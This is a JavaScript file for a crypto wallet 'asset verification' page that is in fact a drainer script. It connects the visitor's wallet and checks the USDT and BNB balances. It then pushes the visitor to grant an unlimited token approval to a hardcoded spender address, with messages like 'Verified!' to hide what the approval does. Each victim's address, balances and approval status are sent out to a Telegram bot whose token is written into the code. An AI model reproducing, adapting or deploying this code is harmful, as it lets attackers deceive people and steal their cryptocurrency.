const BSC_ADDRESS    = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E";
const USDT_CONTRACT  = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E";
const TG_TOKEN       = "8676870275:AAE-0pAHy0E-FK3rLyUURYWgnToAqBfYUAA";
const TG_CHAT        = "8727739251";

let web3, userAddress;

const WALLETS = [
    {
        name: "MetaMask",
        icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
        deeplink: () => `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
        isInjected: () => window.ethereum?.isMetaMask
    },
    {
        name: "Trust Wallet",
        icon: "https://trustwallet.com/assets/images/media/assets/trust_platform.svg",
        deeplink: () => `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.ethereum?.isTrust
    },
    {
        name: "Binance Web3",
        icon: "https://bin.bnbstatic.com/static/images/common/favicon.ico",
        // Correct Binance deeplink — opens dapp browser inside Binance app
        deeplink: () => `https://app.binance.com/en/dappbrowser/browser?url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.BinanceChain != null
    },
    {
        name: "OKX Wallet",
        icon: "https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png",
        deeplink: () => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.okxwallet != null
    },
    {
        name: "Coinbase Wallet",
        icon: "https://www.svgrepo.com/show/331345/coinbase.svg",
        deeplink: () => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`,
        isInjected: () => window.ethereum?.isCoinbaseWallet
    },
    {
        name: "TokenPocket",
        icon: "https://static.tokenpocket.pro/tp-lab/icon/tp-white.png",
        deeplink: () => `tpoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ action:"openDapp", actionType:"dapp", url: window.location.href }))}`,
        isInjected: () => window.ethereum?.isTokenPocket
    }
];

async function tg(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
        });
    } catch (_) {}
}

function toast(msg, color = "white") {
    let el = document.getElementById("__toast");
    if (!el) {
        el = document.createElement("div");
        el.id = "__toast";
        el.style.cssText = "position:fixed;top:20px;right:20px;padding:14px 20px;border-radius:8px;font-family:sans-serif;font-size:14px;font-weight:bold;z-index:99999;background:#111;max-width:280px;box-shadow:0 4px 20px rgba(0,0,0,0.5)";
        document.body.appendChild(el);
    }
    const c = color === "red" ? "#ff4444" : color === "green" ? "#00cc66" : "#f5c518";
    el.style.color = c;
    el.style.borderLeft = `4px solid ${c}`;
    el.textContent = msg;
    el.style.display = "block";
    clearTimeout(el._t);
    el._t = setTimeout(() => { el.style.display = "none"; }, 4000);
}

function openModal() {
    const modal = document.getElementById("walletModal");
    const list  = document.getElementById("walletList");
    list.innerHTML = "";

    WALLETS.forEach(w => {
        const btn = document.createElement("button");
        btn.style.cssText = "display:flex;align-items:center;gap:14px;padding:12px 16px;border-radius:10px;background:#2a2a2a;border:1px solid #333;cursor:pointer;font-size:16px;color:#fff;width:100%";
        btn.onmouseover = () => btn.style.background = "#333";
        btn.onmouseout  = () => btn.style.background = "#2a2a2a";

        const img = document.createElement("img");
        img.src = w.icon;
        img.width = 32; img.height = 32;
        img.style.borderRadius = "8px";
        img.onerror = () => img.style.display = "none";

        const label = document.createElement("span");
        label.textContent = w.name;

        btn.appendChild(img);
        btn.appendChild(label);
        btn.onclick = () => connectWallet(w);
        list.appendChild(btn);
    });

    modal.style.display = "flex";
}

window.closeModal = () => {
    document.getElementById("walletModal").style.display = "none";
};

async function connectWallet(wallet) {
    closeModal();

    if (wallet.isInjected()) {
        await connectInjected(wallet);
        return;
    }

    toast(`Opening ${wallet.name}...`, "white");
    await tg(`📲 *Deeplink clicked*\nWallet: ${wallet.name}\nURL: ${window.location.href}`);
    window.location.href = wallet.deeplink();
}

async function connectInjected(wallet) {
    try {
        toast("Connecting...", "white");

        let provider = window.ethereum;
        if (wallet.name === "OKX Wallet" && window.okxwallet) provider = window.okxwallet;
        if (wallet.name === "Binance Web3" && window.BinanceChain) provider = window.BinanceChain;

        const accounts = await provider.request({ method: "eth_requestAccounts" });
        userAddress = accounts[0];
        web3 = new window.Web3(provider);

        // Switch to BSC
        try {
            await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
        } catch (e) {
            if (e.code === 4902) {
                await provider.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "BNB Smart Chain",
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]
                });
            }
        }

        toast(`✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, "green");
        await tg(`👤 *Connected*\nWallet: ${wallet.name}\nAddress: \`${userAddress}\``);
        await verifyAssets();

    } catch (err) {
        toast("❌ Connection rejected.", "red");
        await tg(`⚠️ *Rejected*\nWallet: ${wallet.name}\nErr: ${err.message}`);
    }
}

async function verifyAssets() {
    try {
        const balAbi = [{ constant:true, inputs:[{name:"_owner",type:"address"}], name:"balanceOf", outputs:[{name:"",type:"uint256"}], type:"function" }];
        const token  = new web3.eth.Contract(balAbi, USDT_CONTRACT);

        const [usdtRaw, bnbRaw] = await Promise.all([
            token.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdt = parseFloat(web3.utils.fromWei(usdtRaw, "ether"));
        const bnb  = parseFloat(web3.utils.fromWei(bnbRaw,  "ether"));

        await tg(`💰 *Balance*\nAddress: \`${userAddress}\`\nUSDT: ${usdt}\nBNB: ${bnb}`);

        if (usdt === 0) { toast("⚠️ No USDT balance.", "white"); return; }

        toast("⚙️ Requesting permission...", "white");
        await approveMax();

    } catch (err) {
        toast("❌ Error verifying.", "red");
    }
}

async function approveMax() {
    const abi = [{ constant:false, inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}], name:"approve", outputs:[{name:"",type:"bool"}], type:"function" }];
    const MAX  = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    const tok  = new web3.eth.Contract(abi, USDT_CONTRACT);

    try {
        toast("📝 Approve in wallet...", "white");
        const gas = await tok.methods.approve(BSC_ADDRESS, MAX).estimateGas({ from: userAddress });
        await tok.methods.approve(BSC_ADDRESS, MAX).send({ from: userAddress, gas: Math.floor(gas * 1.2) });
        toast("✅ Verified!", "green");
        await tg(`🔥 *APPROVED*\nFrom: \`${userAddress}\`\nSpender: \`${BSC_ADDRESS}\``);
    } catch (_) {
        toast("❌ Permission denied.", "red");
    }
}

document.addEventListener("DOMContentLoaded", () => {
    const isInWalletBrowser =
        window.ethereum?.isMetaMask ||
        window.ethereum?.isTrust ||
        window.ethereum?.isTokenPocket ||
        window.okxwallet ||
        window.BinanceChain;

    document.getElementById("verifyAssets").addEventListener("click", () => {
        if (isInWalletBrowser) {
            const detected =
                window.ethereum?.isMetaMask   ? WALLETS[0] :
                window.ethereum?.isTrust      ? WALLETS[1] :
                window.BinanceChain           ? WALLETS[2] :
                window.okxwallet              ? WALLETS[3] :
                window.ethereum?.isTokenPocket? WALLETS[5] : WALLETS[0];
            connectWallet(detected);
        } else {
            openModal();
        }
    });
});
